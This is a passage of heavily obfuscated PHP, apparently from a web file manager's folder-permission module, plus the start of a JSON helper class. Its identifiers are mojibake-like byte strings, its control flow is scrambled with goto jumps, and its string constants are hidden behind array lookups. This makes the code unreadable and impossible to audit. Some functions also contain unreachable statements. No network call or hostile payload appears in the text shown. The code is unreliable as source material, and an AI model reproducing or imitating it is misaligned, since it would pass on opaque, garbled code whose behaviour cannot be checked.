$EÀªœ¬Ç[$aªäÜ¾ĞŒ[2142]] == $aªäÜ¾ĞŒ[83]) { $A™ Ş÷ò®…[] = $EÀªœ¬Ç[$aªäÜ¾ĞŒ[367]]; } } $B¤ãÚ²‚¡ = $this->userGroupParents($e”˜Šò™Çœ); $DàŒ«ƒƒ³Ò = array($aªäÜ¾ĞŒ[371] => SourceModel::TYPE_USER, $aªäÜ¾ĞŒ[458] => $e”˜Šò™Çœ); goto b¨—ˆğ ã; Dƒ²ŞÅÄ: foreach ($D±¹çÌ–Œ£ as $a…çã°Ø¥) { $Bß­×Æ ¥‰ = $aõ«¨›ÃÖ™->getInfo($a…çã°Ø¥); $aÈæÃÅˆÖç = $dÜ“åæ„->parentLevelArray($Bß­×Æ ¥‰[$aªäÜ¾ĞŒ[461]]); $EºÙ‡ƒ = array_merge($EºÙ‡ƒ, $aÈæÃÅˆÖç); } $EºÙ‡ƒ = array_values(array_unique($EºÙ‡ƒ)); foreach ($EºÙ‡ƒ as $a…çã°Ø¥) { $Bß­×Æ ¥‰ = $aõ«¨›ÃÖ™->getInfo($a…çã°Ø¥); $Eöã‡ÚíÖ‰[] = $Bß­×Æ ¥‰[$aªäÜ¾ĞŒ[391]][$aªäÜ¾ĞŒ[369]]; $a•µÌÅÏÇÏ[$a…çã°Ø¥] = $Bß­×Æ ¥‰[$aªäÜ¾ĞŒ[391]][$aªäÜ¾ĞŒ[369]]; $dõ©»ŠÏ˜²[$a…çã°Ø¥] = $dÜ“åæ„->parentLevelArray($Bß­×Æ ¥‰[$aªäÜ¾ĞŒ[461]]); } goto eŸõÂªÜÑù; Fòï•†¬×±: if (isset($Aµøâ…Ä™[$e”˜Šò™Çœ])) { return $Aµøâ…Ä™[$e”˜Šò™Çœ]; } $eÆ™›ƒÉš = Model($aªäÜ¾ĞŒ[2304])->listData(); $A™ Ş÷ò®… = array(); goto eµÈ›¾Ò²´; b²Èå‹³£: $BĞÏÀ©Ëì = array(); $a•µÌÅÏÇÏ = array(); $dõ©»ŠÏ˜² = array(); goto d¤§¡³’·; eÂ–Ø¥ÈÅ‚: $Aµøâ…Ä™[$e”˜Šò™Çœ] = $b‚£ñòòğÄ; return $b‚£ñòòğÄ; goto d«™ÑëµÓ¶; d«™ÑëµÓ¶: } private function makeSourceAuth($DŠØ…½©¦, $aº„¬µŠ«º, $e²Ó‡÷Ò• = false) { goto C‡õÁÕÎÀª; B› óãëø¾: foreach ($dÏø»ß¤‚Ú as $C·„à‰ß¶›) { if (!isset($aº„¬µŠ«º[$C·„à‰ß¶›])) { continue; } $D›“èÂÈ½Ó = $this->authMake($aº„¬µŠ«º[$C·„à‰ß¶›], $e²Ó‡÷Ò•); if ($D›“èÂÈ½Ó[$cæ’·±ĞÀˆ[418]]) { $E¬¡ÔŞİØ = $D›“èÂÈ½Ó; break; } } if (!$fË¶äÍ¼ÇÏ) { return $E¬¡ÔŞİØ; } if (!$E¬¡ÔŞİØ && $D×¦Åì§ë) { $E¬¡ÔŞİØ = $this->groupAuthInfo($D×¦Åì§ë, $aŒì‡·šâÁ); } goto FÓ’±¢†ñ; fçëê³©Ñ¿: $dÏø»ß¤‚Ú = Model($cæ’·±ĞÀˆ[1130])->parentLevelArray($DŠØ…½©¦[$cæ’·±ĞÀˆ[461]]); $dÏø»ß¤‚Ú = array_merge(array($DŠØ…½©¦[$cæ’·±ĞÀˆ[369]]), array_reverse($dÏø»ß¤‚Ú)); $E¬¡ÔŞİØ = !1; goto B› óãëø¾; FÓ’±¢†ñ: if (!$E¬¡ÔŞİØ) { $F£›Ê“íİ = Model($cæ’·±ĞÀˆ[460])->getInfo($aŒì‡·šâÁ); $A©ø‚ëå·› = explode($cæ’·±ĞÀˆ[47], trim($F£›Ê“íİ[$cæ’·±ĞÀˆ[461]], $cæ’·±ĞÀˆ[47])); foreach ($A©ø‚ëå·› as $CÛÀ«ƒ†¿£) { if ($CÛÀ«ƒ†¿£ == $cæ’·±ĞÀˆ[470] || $CÛÀ«ƒ†¿£ == $EÍ¾ƒ‰¤…¬) { continue; } $dò–éŒóÆ¿ = $this->groupRootAuth($CÛÀ«ƒ†¿£, $e²Ó‡÷Ò•); if (!$dò–éŒóÆ¿) { continue; } $E¬¡ÔŞİØ = $this->groupAuthInfo($dò–éŒóÆ¿, $CÛÀ«ƒ†¿£); break; } } if (!$E¬¡ÔŞİØ || $E¬¡ÔŞİØ[$cæ’·±ĞÀˆ[377]] <= 0) { $EŠŒŠ£å“à = $this->authDeepCheck($DŠØ…½©¦[$cæ’·±ĞÀˆ[369]], $e²Ó‡÷Ò•); if ($EŠŒŠ£å“à) { $E¬¡ÔŞİØ = $EŠŒŠ£å“à; } } return $E¬¡ÔŞİØ; goto dªÒ†£†ƒñ; C‡õÁÕÎÀª: $cæ’·±ĞÀˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÍ¾ƒ‰¤…¬ = $cæ’·±ĞÀˆ[83]; $aŒì‡·šâÁ = $DŠØ…½©¦[$cæ’·±ĞÀˆ[458]]; goto fŸ¼¨šÔÏ½; fŸ¼¨šÔÏ½: $fË¶äÍ¼ÇÏ = $DŠØ…½©¦[$cæ’·±ĞÀˆ[371]] == SourceModel::TYPE_GROUP; $D×¦Åì§ë = $fË¶äÍ¼ÇÏ ? $this->groupRootAuth($aŒì‡·šâÁ, $e²Ó‡÷Ò•) : !1; if ($D×¦Åì§ë && Model($cæ’·±ĞÀˆ[2285])->authCheckAction($D×¦Åì§ë[$cæ’·±ĞÀˆ[376]], $cæ’·±ĞÀˆ[1576])) { return $this->groupAuthInfo($D×¦Åì§ë, $aŒì‡·šâÁ); } goto fçëê³©Ñ¿; dªÒ†£†ƒñ: } private function userIsRoot($d‰Â§à­¸® = false) { $a•©âààÂ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$d‰Â§à­¸® && _get($GLOBALS, $a•©âààÂ[459])) { return !0; } $Aˆ©Íø¢× = Model($a•©âààÂ[479])->getInfo($d‰Â§à­¸®); $CïŒÎĞÁ¬ = Model($a•©âààÂ[2307])->listData($Aˆ©Íø¢×[$a•©âààÂ[1335]]); if ($CïŒÎĞÁ¬ && $CïŒÎĞÁ¬[$a•©âààÂ[1205]][$a•©âààÂ[2308]] == 1) { return !0; } return !1; } private function sourceAuthInfo($FÀ­‹ÔÈ‰ë) { goto e£Æ“¾Ñê°; AÌáœ¹ÆÒ: $a„Ğë­íğ˜ = $A¤á‚ÑàË->_listAppendPath($a„Ğë­íğ˜); $FİÔŠÜ–¤ = $a„Ğë­íğ˜[0]; $dâ¾Å°Á„ = $FİÔŠÜ–¤[$aí½ÊßÃ•Ğ[468]]; goto dêø½íÓ»; Cš¡÷Ä™¯Ç: if (!$FİÔŠÜ–¤) { return !1; } $A¤á‚ÑàË->groupPathDisplay($FİÔŠÜ–¤); $a„Ğë­íğ˜ = array($FİÔŠÜ–¤); goto AÌáœ¹ÆÒ; e£Æ“¾Ñê°: $aí½ÊßÃ•Ğ =& $_SERVER[¬ˆÚÂ”Éğä]; $A¤á‚ÑàË = Model($aí½ÊßÃ•Ğ[1130]); $FİÔŠÜ–¤ = $A¤á‚ÑàË->sourceInfo($FÀ­‹ÔÈ‰ë); goto Cš¡÷Ä™¯Ç; dêø½íÓ»: if (isset($FİÔŠÜ–¤[$aí½ÊßÃ•Ğ[466]])) { $eñ½ìæƒ¯Ô = explode($aí½ÊßÃ•Ğ[8], trim($FİÔŠÜ–¤[$aí½ÊßÃ•Ğ[468]], $aí½ÊßÃ•Ğ[8])); array_shift($eñ½ìæƒ¯Ô); $dâ¾Å°Á„ = $FİÔŠÜ–¤[$aí½ÊßÃ•Ğ[464]] . $aí½ÊßÃ•Ğ[2309] . implode($aí½ÊßÃ•Ğ[8], $eñ½ìæƒ¯Ô); } return array($aí½ÊßÃ•Ğ[386] => $FİÔŠÜ–¤[$aí½ÊßÃ•Ğ[28]], $aí½ÊßÃ•Ğ[75] => KodIO::make($FİÔŠÜ–¤[$aí½ÊßÃ•Ğ[369]]), $aí½ÊßÃ•Ğ[2310] => $dâ¾Å°Á„); goto D‰×É‰é­ª; D‰×É‰é­ª: } private function groupAuthInfo($fßÓÀ™É, $bÊŞè½ÖÖ) { $AÚ®µÛÍê¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $dÂ††œ˜ê = Model($AÚ®µÛÍê¯[460])->getInfo($bÊŞè½ÖÖ); return array($AÚ®µÛÍê¯[2311] => intval($fßÓÀ™É[$AÚ®µÛÍê¯[376]]), $AÚ®µÛÍê¯[2294] => $fßÓÀ™É, $AÚ®µÛÍê¯[2312] => LNG($AÚ®µÛÍê¯[2313]), $AÚ®µÛÍê¯[2303] => array($AÚ®µÛÍê¯[386] => $dÂ††œ˜ê[$AÚ®µÛÍê¯[28]], $AÚ®µÛÍê¯[75] => KodIO::make($dÂ††œ˜ê[$AÚ®µÛÍê¯[391]][$AÚ®µÛÍê¯[369]]), $AÚ®µÛÍê¯[2310] => $dÂ††œ˜ê[$AÚ®µÛÍê¯[465]])); } protected function groupRootAuth($e¡¸Ğ÷Ô’Ú, $E’ì´ÁÕâÁ = false) { goto EÄˆ“ÍÙÙ¸; c»ËÍğİäê: $FàáÒ¢©ƒ– = $dÑ®ï§Ê³Æ ? $this->authMake($dÑ®ï§Ê³Æ, $E’ì´ÁÕâÁ) : !1; $B—Ÿ›š¬…´[$aº­–ËÊÛÖ] = $FàáÒ¢©ƒ– ? $FàáÒ¢©ƒ–[$aİéçì‹Ñˆ[418]] : $FïÁ¦äÁŸ; return $B—Ÿ›š¬…´[$aº­–ËÊÛÖ]; goto B›‘Ò¼¶; EÄˆ“ÍÙÙ¸: $aİéçì‹Ñˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $E’ì´ÁÕâÁ = $E’ì´ÁÕâÁ ? $E’ì´ÁÕâÁ : USER_ID; $aº­–ËÊÛÖ = $E’ì´ÁÕâÁ . $aİéçì‹Ñˆ[2314] . $e¡¸Ğ÷Ô’Ú; goto eé‘š‹êÖ; eé‘š‹êÖ: static $B—Ÿ›š¬…´ = array(); if (isset($B—Ÿ›š¬…´[$aº­–ËÊÛÖ])) { return $B—Ÿ›š¬…´[$aº­–ËÊÛÖ]; } $fÈŠê¨Ëƒµ = $this->userGroupList($E’ì´ÁÕâÁ); goto Bºëª­Ğ ¦; Bºëª­Ğ ¦: $FïÁ¦äÁŸ = isset($fÈŠê¨Ëƒµ[$e¡¸Ğ÷Ô’Ú]) ? $fÈŠê¨Ëƒµ[$e¡¸Ğ÷Ô’Ú][$aİéçì‹Ñˆ[376]] : !1; if ($FïÁ¦äÁŸ && Model($aİéçì‹Ñˆ[2285])->authCheckAction($FïÁ¦äÁŸ[$aİéçì‹Ñˆ[376]], $aİéçì‹Ñˆ[1576])) { $B—Ÿ›š¬…´[$aº­–ËÊÛÖ] = $FïÁ¦äÁŸ; return $FïÁ¦äÁŸ; } $C†¹øğîßß = Model($aİéçì‹Ñˆ[460])->getInfo($e¡¸Ğ÷Ô’Ú); goto A÷Õï¢‹ˆ‰; A÷Õï¢‹ˆ‰: $bËˆïÛ Á¦ = array($aİéçì‹Ñˆ[369] => $C†¹øğîßß[$aİéçì‹Ñˆ[391]][$aİéçì‹Ñˆ[369]]); $DÜ§İÅÃó = $aİéçì‹Ñˆ[2293]; $dÑ®ï§Ê³Æ = $this->field($DÜ§İÅÃó)->cacheMemory()->where($bËˆïÛ Á¦)->select(); goto c»ËÍğİäê; B›‘Ò¼¶: } public function authOwnerApply($aÌŸÚ¢ï††) { goto d‡àëˆ…®; FÆ¡Á³“Ïë: $aÌŸÚ¢ï††[$cˆïÅ[376]][$cˆïÅ[2317]] = Model($cˆïÅ[476])->userListInfo($e·Í¨Ç‘àˆ); return $aÌŸÚ¢ï††; goto AæôèŒËƒÊ; aİĞÌ’Øğã: $f–‰Œ²–³ª = array($cˆïÅ[383] => array($cˆïÅ[384], $EÇÙäèàéâ)); $E¥’ƒ·ñâ = $this->field($dòÉŞÓ„Š¹)->where($f–‰Œ²–³ª)->select(); $E¥’ƒ·ñâ = array_to_keyvalue_group($E¥’ƒ·ñâ, $cˆïÅ[369]); goto c£Úë¯–Ô; d‡àëˆ…®: $cˆïÅ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($aÌŸÚ¢ï††[$cˆïÅ[376]]) || isset($aÌŸÚ¢ï††[$cˆïÅ[2315]]) && $aÌŸÚ¢ï††[$cˆïÅ[2315]]) { return $aÌŸÚ¢ï††; } if (AuthModel::authCheckRoot($aÌŸÚ¢ï††[$cˆïÅ[376]][$cˆïÅ[377]])) { return $aÌŸÚ¢ï††; } goto A´æÑ‘Òİè; c£Úë¯–Ô: $fÙŠ½„òâ = array(); $e·Í¨Ç‘àˆ = array(); foreach ($E¥’ƒ·ñâ as $BÔæÃ‘èÉ => $f‰öƒš¿ˆ) { $aóÒ÷“”¶ = $this->authFolderOwnerUser($f‰öƒš¿ˆ); $fÙŠ½„òâ[$BÔæÃ‘èÉ] = $aóÒ÷“”¶; $e·Í¨Ç‘àˆ = array_merge($e·Í¨Ç‘àˆ, $aóÒ÷“”¶[$cˆïÅ[537]]); if ($aóÒ÷“”¶[$cˆïÅ[2316]]) { break; } } goto dêø–ë’¥¶; A´æÑ‘Òİè: $EÇÙäèàéâ = Model($cˆïÅ[1130])->parentLevelArray($aÌŸÚ¢ï††[$cˆïÅ[461]]); $EÇÙäèàéâ = array_merge(array($aÌŸÚ¢ï††[$cˆïÅ[369]]), array_reverse($EÇÙäèàéâ)); $dòÉŞÓ„Š¹ = $cˆïÅ[2293]; goto aİĞÌ’Øğã; dêø–ë’¥¶: if (count($e·Í¨Ç‘àˆ) == 0) { $e·Í¨Ç‘àˆ = $this->authFolderOwnerGroup($aÌŸÚ¢ï††[$cˆïÅ[458]]); } $e·Í¨Ç‘àˆ = array_unique($e·Í¨Ç‘àˆ); if (AuthModel::authCheckRoot($aÌŸÚ¢ï††[$cˆïÅ[376]][$cˆïÅ[377]])) { $e·Í¨Ç‘àˆ[] = USER_ID; } goto FÆ¡Á³“Ïë; AæôèŒËƒÊ: } private function authFolderOwnerGroup($b‚™‚½­¼æ) { $e¶µ‰ñŒôø =& $_SERVER[¬ˆÚÂ”Éğä]; $D†‘˜Š“Æµ = Model($e¶µ‰ñŒôø[2200])->where(array($e¶µ‰ñŒôø[2121] => $b‚™‚½­¼æ))->select(); $dŞÄ®Ãç• = array(); if (!$D†‘˜Š“Æµ) { return $dŞÄ®Ãç•; } foreach ($D†‘˜Š“Æµ as $dÙØÉ‚Š) { $AÜ¤»¦óÈ = $this->authInfo($dÙØÉ‚Š); if (AuthModel::authCheckRoot($AÜ¤»¦óÈ[$e¶µ‰ñŒôø[376]])) { $dŞÄ®Ãç•[] = $dÙØÉ‚Š[$e¶µ‰ñŒôø[1450]]; } } return $dŞÄ®Ãç•; } private function authFolderOwnerUser($fö¥ë•ÆßÍ) { $C§ˆ—®ªÒƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $BÜ“²øÓó¶ = array(); $bÓÆÌä²¨… = !1; foreach ($fö¥ë•ÆßÍ as $CØˆ‚¼Á³ê) { $d¥¸ƒ¿Ï´Š = $this->authInfo($CØˆ‚¼Á³ê); if ($CØˆ‚¼Á³ê[$C§ˆ—®ªÒƒ[458]] == $C§ˆ—®ªÒƒ[470]) { $bÓÆÌä²¨… = !0; } if ($CØˆ‚¼Á³ê[$C§ˆ—®ªÒƒ[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($d¥¸ƒ¿Ï´Š[$C§ˆ—®ªÒƒ[376]])) { $BÜ“²øÓó¶[] = $CØˆ‚¼Á³ê[$C§ˆ—®ªÒƒ[458]]; } } } return array($C§ˆ—®ªÒƒ[537] => $BÜ“²øÓó¶, $C§ˆ—®ªÒƒ[2316] => $bÓÆÌä²¨…); } public function authMake($B…›ŞÚâ›¿, $E‰¹Í×Ğ„Œ = false) { goto FŒìÎ¥ñ©­; eóÖÎ³ìÄ²: $e‡¢À÷•„ = 0; $cõÊÀÀ©ÃŸ = 0; $f¬ğ£Ê²¨ = 0; goto f¤Ê«¹éä¼; D²òÅ¨¢åÊ: $fÉò¼¯İí = 0; $B–Öù‘Ş” = 0; $A¹ö¶êÀ˜É = array($e¾ºáøÏ»[369] => 0); goto eŠ‚°¶£¥ä; e—©´’Ê×ì: $b²¢Åäƒ±˜ = 0; $a«ù©‘¼ëË = 0; $bºğÃº–Ï¢ = 0; goto eóÖÎ³ìÄ²; FŒìÎ¥ñ©­: $e¾ºáøÏ» =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$B…›ŞÚâ›¿) { return array($e¾ºáøÏ»[377] => 0, $e¾ºáøÏ»[418] => !1); } $E‰¹Í×Ğ„Œ = $E‰¹Í×Ğ„Œ ? $E‰¹Í×Ğ„Œ : USER_ID; goto e—©´’Ê×ì; eŠ‚°¶£¥ä: foreach ($B…›ŞÚâ›¿ as $A¹ö¶êÀ˜É) { $eº—Âéò†· = $this->authInfo($A¹ö¶êÀ˜É); $B›Ş¾‹í‘‹ = $A¹ö¶êÀ˜É[$e¾ºáøÏ»[458]]; $C¨£½¡¼æÏ = intval($eº—Âéò†·[$e¾ºáøÏ»[376]]); if ($A¹ö¶êÀ˜É[$e¾ºáøÏ»[371]] == SourceModel::TYPE_USER && $B›Ş¾‹í‘‹ == $E‰¹Í×Ğ„Œ) { $b²¢Åäƒ±˜ = !0; $bºğÃº–Ï¢ = $eº—Âéò†·; $a«ù©‘¼ëË = $C¨£½¡¼æÏ; } else { if ($A¹ö¶êÀ˜É[$e¾ºáøÏ»[371]] == SourceModel::TYPE_GROUP && $this->groupContainUser($B›Ş¾‹í‘‹, $E‰¹Í×Ğ„Œ)) { $e‡¢À÷•„ = !0; $cœ¶À‚ôˆ§ = $this->groupStepToUserGroup($B›Ş¾‹í‘‹, $E‰¹Í×Ğ„Œ); if ($cœ¶À‚ôˆ§ < $bà‡éŒœ£‰) { $bà‡éŒœ£‰ = $cœ¶À‚ôˆ§; $cõÊÀÀ©ÃŸ = $C¨£½¡¼æÏ; $f¬ğ£Ê²¨ = $eº—Âéò†·; $EŸŸ‰ãÆÀ = $B›Ş¾‹í‘‹; } if ($cœ¶À‚ôˆ§ == $bà‡éŒœ£‰ && $C¨£½¡¼æÏ >= $cõÊÀÀ©ÃŸ) { $cõÊÀÀ©ÃŸ = $C¨£½¡¼æÏ; $f¬ğ£Ê²¨ = $eº—Âéò†·; $EŸŸ‰ãÆÀ = $B›Ş¾‹í‘‹; } } else { if ($B›Ş¾‹í‘‹ == $e¾ºáøÏ»[470]) { $Eç²ŠêÁ = !0; $B–Öù‘Ş” = $eº—Âéò†·; $fÉò¼¯İí = $C¨£½¡¼æÏ; } } } } if ($b²¢Åäƒ±˜) { $d×ŞÃË—­ = $a«ù©‘¼ëË; $eº—Âéò†· = $bºğÃº–Ï¢; $C¿Ô¬ø›Çø = LNG($e¾ºáøÏ»[2318]); } else { if ($e‡¢À÷•„) { $d×ŞÃË—­ = $cõÊÀÀ©ÃŸ; $eº—Âéò†· = $f¬ğ£Ê²¨; $eßøØî”ÇÇ = Model($e¾ºáøÏ»[460])->getInfo($EŸŸ‰ãÆÀ); $C¿Ô¬ø›Çø = $e¾ºáøÏ»[157] . $eßøØî”ÇÇ[$e¾ºáøÏ»[465]] . $e¾ºáøÏ»[2319] . LNG($e¾ºáøÏ»[2320]); } else { if ($Eç²ŠêÁ) { $d×ŞÃË—­ = $fÉò¼¯İí; $eº—Âéò†· = $B–Öù‘Ş”; $C¿Ô¬ø›Çø = LNG($e¾ºáøÏ»[2290]); } else { $C¿Ô¬ø›Çø = $e¾ºáøÏ»[33]; } } } $Cˆ÷©æ· Î = array($e¾ºáøÏ»[2311] => intval($d×ŞÃË—­), $e¾ºáøÏ»[2294] => $eº—Âéò†·, $e¾ºáøÏ»[2312] => $C¿Ô¬ø›Çø, $e¾ºáøÏ»[2303] => $this->sourceAuthInfo($A¹ö¶êÀ˜É[$e¾ºáøÏ»[369]])); goto Fè¥ÖêßîÎ; Fè¥ÖêßîÎ: return $Cˆ÷©æ· Î; goto c®å‰ßÕè±; f¤Ê«¹éä¼: $bà‡éŒœ£‰ = 1000; $EŸŸ‰ãÆÀ = 0; $Eç²ŠêÁ = 0; goto D²òÅ¨¢åÊ; c®å‰ßÕè±: } private function groupContainUser($C¯«¤Ö‘–•, $e˜ˆêá¦é½ = false) { return in_array($C¯«¤Ö‘–•, $this->userGroupParents($e˜ˆêá¦é½)); } private function groupStepToUserGroup($B„áöÅŸÙ, $e…Û¸õ—Ÿˆ = false) { goto föÀá‹ÙíŸ; föÀá‹ÙíŸ: $a§¥Ì…ù†ã =& $_SERVER[¬ˆÚÂ”Éğä]; $cóäå—áº¢ = $this->userGroupList($e…Û¸õ—Ÿˆ); $CƒÄ—ßø¨ = 1000; goto a†ÁÌÃ¦‘î; a†ÁÌÃ¦‘î: $bŸè¥ƒ†Üª = $GLOBALS[$a§¥Ì…ù†ã[6]][$a§¥Ì…ù†ã[84]][$a§¥Ì…ù†ã[2212]] == 1; $Eøë©¹»»ã = $bŸè¥ƒ†Üª ? 3 : 2; foreach ($cóäå—áº¢ as $D™äùØéµƒ) { if ($D™äùØéµƒ[$a§¥Ì…ù†ã[2121]] == $B„áöÅŸÙ) { return 0; } $aù‰¹œíÓ = explode($a§¥Ì…ù†ã[47], trim($D™äùØéµƒ[$a§¥Ì…ù†ã[461]], $a§¥Ì…ù†ã[47])); if ($aù‰¹œíÓ[0] == $a§¥Ì…ù†ã[470] && count($aù‰¹œíÓ) > $Eøë©¹»»ã) { $eĞòäÒ—¦ = array_reverse(array_slice($aù‰¹œíÓ, $Eøë©¹»»ã)); $AÓÁ•Ô¯‘ = array_search($B„áöÅŸÙ, $eĞòäÒ—¦); if ($AÓÁ•Ô¯‘ !== !1 && $AÓÁ•Ô¯‘ + 1 <= $CƒÄ—ßø¨) { $CƒÄ—ßø¨ = $AÓÁ•Ô¯‘ + 1; } } } goto b’…ÏÉÎŒâ; b’…ÏÉÎŒâ: return $CƒÄ—ßø¨; goto AÙ‘‰Ïª¢; AÙ‘‰Ïª¢: } private function userGroupList($a¨‰œªÃ¼  = false) { $e ŒÕÊ¶™  =& $_SERVER[¬ˆÚÂ”Éğä]; static $aİª²ÁòÙ¯ = array(); if (isset($aİª²ÁòÙ¯[$a¨‰œªÃ¼ ])) { return $aİª²ÁòÙ¯[$a¨‰œªÃ¼ ]; } $c•ï®ê†Äõ = Model($e ŒÕÊ¶™ [479])->getInfo($a¨‰œªÃ¼ ); $aİª²ÁòÙ¯[$a¨‰œªÃ¼ ] = array_to_keyvalue($c•ï®ê†Äõ[$e ŒÕÊ¶™ [2291]], $e ŒÕÊ¶™ [2121]); return $aİª²ÁòÙ¯[$a¨‰œªÃ¼ ]; } public function userGroupParents($bèÓÅ‡†éÂ) { goto A§ƒˆˆÖ’; A§ƒˆˆÖ’: $C§â°Æ™à« =& $_SERVER[¬ˆÚÂ”Éğä]; static $A”· ‰ÌÚİ = array(); $bèÓÅ‡†éÂ = $bèÓÅ‡†éÂ ? $bèÓÅ‡†éÂ : USER_ID; goto E‰èˆˆ®–; EóºŸçŸÂÙ: $e‚Ğ«ÜÜÅ« = $GLOBALS[$C§â°Æ™à«[6]][$C§â°Æ™à«[84]][$C§â°Æ™à«[2212]] == 1; $cÓ°èÕŠ  = $e‚Ğ«ÜÜÅ« ? 3 : 2; foreach ($CÆ¨„˜íÆ¬ as $dİƒ™êŒğ) { $B—»ôÄ®§Ì = array($dİƒ™êŒğ[$C§â°Æ™à«[2121]]); $cœ ¸Ùãå¹ = explode($C§â°Æ™à«[47], trim($dİƒ™êŒğ[$C§â°Æ™à«[461]], $C§â°Æ™à«[47])); if ($cœ ¸Ùãå¹[0] == $C§â°Æ™à«[470] && count($cœ ¸Ùãå¹) > $cÓ°èÕŠ ) { $aäÆ™ÛŸÅê = array_slice($cœ ¸Ùãå¹, $cÓ°èÕŠ ); $B—»ôÄ®§Ì = array_merge($B—»ôÄ®§Ì, array_reverse($aäÆ™ÛŸÅê)); } $Dá±¾‚•©º = array_merge($Dá±¾‚•©º, $B—»ôÄ®§Ì); } goto e¶¡øÌğ„ì; E‰èˆˆ®–: if (isset($A”· ‰ÌÚİ[$bèÓÅ‡†éÂ])) { return $A”· ‰ÌÚİ[$bèÓÅ‡†éÂ]; } $CÆ¨„˜íÆ¬ = $this->userGroupList($bèÓÅ‡†éÂ); $Dá±¾‚•©º = array(); goto EóºŸçŸÂÙ; e¶¡øÌğ„ì: $A”· ‰ÌÚİ[$bèÓÅ‡†éÂ] = array_unique($Dá±¾‚•©º); return $A”· ‰ÌÚİ[$bèÓÅ‡†éÂ]; goto B¨—âŸ§¢½; B¨—âŸ§¢½: } public function authTargetInfoMake($F‡Íí¢…“¬) { goto bÎ—‚ÔñŸ; d„•«ÅÇİ›: foreach ($F‡Íí¢…“¬ as $A‘øå‹±ÓÅ) { if ($A‘øå‹±ÓÅ[$ağÑğ“ƒÖ§[371]] == SourceModel::TYPE_USER) { $f×ç§§ĞÒÎ[] = intval($A‘øå‹±ÓÅ[$ağÑğ“ƒÖ§[458]]); } else { if ($A‘øå‹±ÓÅ[$ağÑğ“ƒÖ§[371]] == SourceModel::TYPE_GROUP) { $DºøÛ´«²›[] = intval($A‘øå‹±ÓÅ[$ağÑğ“ƒÖ§[458]]); } } } if ($f×ç§§ĞÒÎ) { $f×ç§§ĞÒÎ = Model($ağÑğ“ƒÖ§[476])->userListInfo($f×ç§§ĞÒÎ); } if ($DºøÛ´«²›) { $b¯ÁÅÂÌ§ = array($ağÑğ“ƒÖ§[2198] => array($ağÑğ“ƒÖ§[384], $DºøÛ´«²›)); $DºøÛ´«²› = Model($ağÑğ“ƒÖ§[460])->field($ağÑğ“ƒÖ§[2211])->where($b¯ÁÅÂÌ§)->select(); $DºøÛ´«²› = array_to_keyvalue($DºøÛ´«²›, $ağÑğ“ƒÖ§[2121]); } goto BÖ®ÅƒÁÖë; bÎ—‚ÔñŸ: $ağÑğ“ƒÖ§ =& $_SERVER[¬ˆÚÂ”Éğä]; $f×ç§§ĞÒÎ = array(); $DºøÛ´«²› = array(); goto d„•«ÅÇİ›; BÖ®ÅƒÁÖë: return array($ağÑğ“ƒÖ§[2321] => $f×ç§§ĞÒÎ, $ağÑğ“ƒÖ§[2322] => $DºøÛ´«²›); goto bĞÖÉÓ¼; bĞÖÉÓ¼: } public function authInfo($eÈ¦Ï‘ô·) { $A©¯õ® ³ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($eÈ¦Ï‘ô·[$A©¯õ® ³[2266]]) { $añÀÏ”÷åÖ = Model($A©¯õ® ³[2285])->listData($eÈ¦Ï‘ô·[$A©¯õ® ³[2266]]); if (!$añÀÏ”÷åÖ) { return !1; $DÔÄçÛë = Model($A©¯õ® ³[2285])->listData(); $E™¨êÀ¡±Ø = array_filter_by_field($DÔÄçÛë, $A©¯õ® ³[376], $A©¯õ® ³[470]); return $E™¨êÀ¡±Ø; } $aåİ±ÔÈè = array_field_key($añÀÏ”÷åÖ, array($A©¯õ® ³[367], $A©¯õ® ³[28], $A©¯õ® ³[376], $A©¯õ® ³[2140], $A©¯õ® ³[2143])); $aåİ±ÔÈè[$A©¯õ® ³[2323]] = $eÈ¦Ï‘ô·; return $aåİ±ÔÈè; } else { return array($A©¯õ® ³[385] => 0, $A©¯õ® ³[2127] => $eÈ¦Ï‘ô·[$A©¯õ® ³[2267]], $A©¯õ® ³[386] => $A©¯õ® ³[33], $A©¯õ® ³[2140] => $A©¯õ® ³[2324]); } } } goto bÙ¬×ƒŠÇ; bğ™Ãà™¦: define($_SERVER[¬ˆÚÂ”Éğä][1954], 32); class Services_JSON { function __construct($C¾‡àÛÃ = 0) { $this->use = $C¾‡àÛÃ; } function utf162utf8($EÑøÖ˜‹ñ) { $dË‡¿íœÊ =& $_SERVER[¬ˆÚÂ”Éğä]; if (function_exists($dË‡¿íœÊ[68])) { return mb_convert_encoding($EÑøÖ˜‹ñ, $dË‡¿íœÊ[1603], $dË‡¿íœÊ[1955]); } $eŠíõèÃ¿ô = ord($EÑøÖ˜‹ñ[0]) << 8 | ord($EÑøÖ˜‹ñ[1]); switch (!0) { case (127 & $eŠíõèÃ¿ô) == $eŠíõèÃ¿ô: return chr(127 & $eŠíõèÃ¿ô); case (2047 & $eŠíõèÃ¿ô) == $eŠíõèÃ¿ô: return chr(192 | $eŠíõèÃ¿ô >> 6 & 31) . chr(128 | $eŠíõèÃ¿ô & 63); case (65535 & $eŠíõèÃ¿ô) == $eŠíõèÃ¿ô: return chr(224 | $eŠíõèÃ¿ô >> 12 & 15) . chr(128 | $eŠíõèÃ¿ô >> 6 & 63) . chr(128 | $eŠíõèÃ¿ô & 63); } return $dË‡¿íœÊ[33]; } function utf82utf16($cñ£Ÿ˜ªÚ) { $D¢Òª¡«›… =& $_SERVER[¬ˆÚÂ”Éğä]; if (function_exists($D¢Òª¡«›…[68])) { return mb_convert_encoding($cñ£Ÿ˜ªÚ, $D¢Òª¡«›…[1955], $D¢Òª¡«›…[1603]); } switch (strlen($cñ£Ÿ˜ªÚ)) { case 1: return $cñ£Ÿ˜ªÚ; case 2: return chr(7 & ord($cñ£Ÿ˜ªÚ[0]) >> 2) . chr(192 & ord($cñ£Ÿ˜ªÚ[0]) << 6 | 63 & ord($cñ£Ÿ˜ªÚ[1])); case 3: return chr(240 & ord($cñ£Ÿ˜ªÚ[0]) << 4 | 15 & ord($cñ£Ÿ˜ªÚ[1]) >> 2) . chr(192 & ord($cñ£Ÿ˜ªÚ[1]) << 6 | 127 & ord($cñ£Ÿ˜ªÚ[2])); } return 